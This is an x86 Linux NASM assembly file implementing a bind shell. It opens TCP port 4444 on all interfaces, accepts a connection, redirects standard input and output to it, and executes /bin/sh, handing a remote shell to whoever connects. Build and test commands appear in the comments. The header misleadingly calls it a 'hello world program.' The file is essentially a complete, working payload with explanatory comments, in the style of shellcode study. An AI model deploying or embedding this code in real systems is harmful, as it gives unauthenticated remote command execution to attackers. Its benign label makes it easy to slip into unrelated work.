; Compiling the program
; For compiling this hello world program you can use nasm and ld
;   $ nasm -f elf32 -o hello.o hello.asm
;   $ ld -m elf_i386 -o hello hello.o
;   $ ./hello
;   
;   to test if it works:
;   $ netstat -antp ; if you see your program running here
;   $ nc 127.0.0.1 4444

global _start

section .text
        _start:

        ; set needed registers to zero
        xor eax, eax
        xor ebx, ebx
        xor ecx, ecx
        xor edx, edx

        ;   ebx, ecx, edx, esi, edi, ebp
        ;   int socket(int domain, int type, int protocol);
        ;

        mov ebx, 2 ; AF_INET value from https://students.mimuw.edu.pl/SO/Linux/Kod/include/linux/socket.h.html
        mov ecx, 1  ; SOCKET_STREAM value from the site above      
        mov eax, 359 ; sys_socket, protocol is not set because it is 0
        
        int 0x80

        ;   int bind(int sockfd, const struct sockaddr *addr,socklen_t addrlen);
        ;

        mov ebx, eax ; put the return value from sys_socket in ebx
        push edx ; ANNY_ADDR value
        push word 0x5c11 ; htos(4444) port in little endian
        push word 0x02 ; AF_INET again and stack alignment
        mov ecx, esp  ; point the top of the stack or the first element of struct sockaddr
        mov edx, 16 ; #define __SOCK_SIZE__ 16 sizeof(struct sockaddr)
        mov eax, 361 ; sys_bind()
        
        int 0x80 ; call kernel

        ; int listen(int sockfd, int backlog);
        ;
        ; sockfd is already in ebx

        xor ecx,ecx ; set ecx to zero
        mov eax, 363 ; listen syscall

        int 0x80 ; call kernel

        ;   int accept(int sockfd, struct sockaddr *_Nullable restrict addr,socklen_t *_Nullable restrict addrlen);
        ;   we are pass null in all args except for sockfd

        xor ecx,ecx
        xor edx,edx
        mov eax, 364

        int 0x80

        ;  int dup2(int oldfd, int newfd);
        ;

        mov ebx, eax ; get the new fd from accept()
        mov eax, 0x3f ; sys_dup2()
        xor ecx,ecx
        int 0x80 ; dup2 to stdin

        mov eax, 0x3f
        inc ecx
        int 0x80

        mov eax, 0x3f
        inc ecx
        int 0x80

        ; execve to /bin/sh

        xor ecx, ecx
        push ecx  ; push zero to top of stack
        push 0x68732f2f ; push the end of /bin/sh
        push 0x6e69622f ; push the beginning

        mov ebx, esp ; pointer to /bin/sh in stack to ebx
        mov eax, 11   

        int 0x80


        xor eax,eax
        mov eax, 1 ; exit

        int 0x80

section .data

